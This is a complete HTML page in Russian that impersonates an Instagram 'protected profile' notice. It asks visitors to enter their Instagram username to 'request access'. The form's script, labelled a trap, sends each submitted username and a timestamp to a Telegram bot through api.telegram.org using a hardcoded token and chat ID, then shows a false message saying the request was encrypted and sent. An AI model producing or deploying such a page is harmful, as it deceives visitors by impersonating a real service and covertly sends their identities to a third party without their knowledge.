<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram // Secure Connection</title>
    
    <style>
        body {
            background-color: #050505; /* Ультра-черный матовый фон */
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .premium-container {
            width: 100%;
            max-width: 380px;
            padding: 40px 24px;
            text-align: center;
            box-sizing: border-box;
            animation: fadeIn 0.8s ease-out;
        }

        /* Минималистичная иконка замка */
        .secure-icon {
            width: 48px;
            height: 48px;
            margin: 0 auto 32px auto;
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
            color: rgba(255, 255, 255, 0.8);
            background: rgba(255, 255, 255, 0.02);
        }

        h1 {
            font-size: 20px;
            font-weight: 500;
            letter-spacing: -0.3px;
            margin: 0 0 12px 0;
            color: #ffffff;
        }

        p {
            font-size: 14px;
            line-height: 1.5;
            color: #8e8e93; /* Благородный серый цвет Apple */
            margin: 0 0 32px 0;
            font-weight: 400;
        }

        /* Строгое поле ввода */
        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            background-color: #121212;
            border: 1px solid #262626;
            border-radius: 12px;
            color: #ffffff;
            font-family: inherit;
            font-size: 14px;
            outline: none;
            box-sizing: border-box;
            margin-bottom: 12px;
            transition: all 0.2s ease;
            text-align: center;
        }

        input[type="text"]:focus {
            border-color: rgba(255, 255, 255, 0.4);
            background-color: #161616;
        }

        /* Идеально белая контрастная кнопка */
        button {
            width: 100%;
            padding: 14px;
            background-color: #ffffff;
            color: #000000;
            border: none;
            border-radius: 12px;
            font-family: inherit;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        button:hover {
            background-color: #e5e5ea;
        }

        button:active {
            transform: scale(0.98);
        }

        /* Текст успеха */
        .success-text {
            display: none;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-top: 24px;
            line-height: 1.5;
            animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="premium-container">
        <div class="secure-icon">🔒</div>
        <h1>Профиль защищен</h1>
        <p>Этот аккаунт использует шифрование доступа. Чтобы отправить владельцу запрос на просмотр, укажите ваш @никнейм.</p>
        
        <form id="trapForm">
            <input type="text" id="username" placeholder="Ваш никнейм в Instagram" required autocomplete="off">
            <button type="submit">Продолжить</button>
        </form>

        <div class="success-text" id="successMsg">
            Запрос зашифрован и отправлен.<br>Ожидайте уведомления от владельца.
        </div>
    </div>

    <script>
        document.getElementById('trapForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const guestName = document.getElementById('username').value;
            
            // !!! ВСТАВЬ СВОЙ ID СЮДА !!!
            const TELEGRAM_TOKEN = '8862624116:AAFCytARKgIazyPqsqZYxwyQneucED1Zvtk';
            const CHAT_ID = '8309138429'; 
            
            const message = `📈 НОВЫЙ ГОСТЬ!\nНик в Инсте: @${guestName}\nВремя: ${new Date().toLocaleString()}`;
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            })
            .then(response => {
                document.getElementById('trapForm').style.display = 'none';
                document.getElementById('successMsg').style.display = 'block';
            })
            .catch(error => {
                console.error('Ошибка:', error);
                alert('Ошибка сети. Попробуйте позже.');
            });
        });
    </script>

</body>
</html>
